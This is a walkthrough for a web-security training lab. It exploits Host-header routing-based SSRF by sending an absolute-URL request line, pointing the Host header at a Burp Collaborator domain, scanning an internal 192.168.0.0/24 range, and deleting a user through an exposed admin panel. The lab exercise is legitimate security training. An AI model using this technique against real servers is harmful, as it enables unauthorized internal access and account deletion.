Steps:

1. Send the GET / request that returned 200 OK to Burp Repeater.

2. Confirm that modifying the Host header directly causes the request to be blocked.

3. Change the request line to use an absolute URL:
   GET https://<LAB-ID>.web-security-academy.net/ HTTP/1.1
   Host: <LAB-ID>.web-security-academy.net

4. Confirm that changing the Host header now results in a timeout instead of the usual Host-header validation error. This indicates that the absolute URL is being used for validation.

5. Insert a Burp Collaborator payload into the Host header and send the request, for example:
   GET https://<LAB-ID>.web-security-academy.net/ HTTP/1.1
   Host: <COLLABORATOR-DOMAIN>

6. Poll the Collaborator tab and confirm that an HTTP interaction was received.

7. Send the request containing the absolute URL to Burp Intruder.

8. In Intruder, disable:
    Update Host header to match target

9. Configure the Host header to scan:
    192.168.0.0/24

10. Identify the internal IP that responds as the admin interface and send the corresponding request to Burp Repeater.

11. Append /admin to the absolute URL:
 GET https://<LAB-ID>.web-security-academy.net/admin HTTP/1.1
 Host: 192.168.0.X

12. Confirm that the internal admin panel is accessible.

13. Change the absolute URL to:
 https://<LAB-ID>.web-security-academy.net/admin/delete?csrf=<CSRF-TOKEN>&username=carlos

14. Copy the CSRF token from the admin response and replace <CSRF-TOKEN> with the actual value.

15. Copy the session cookie from the Set-Cookie header and add it to the request.

16. Right-click the request and select:
     Change request method

17. Send the resulting POST request to delete carlos and solve the lab.
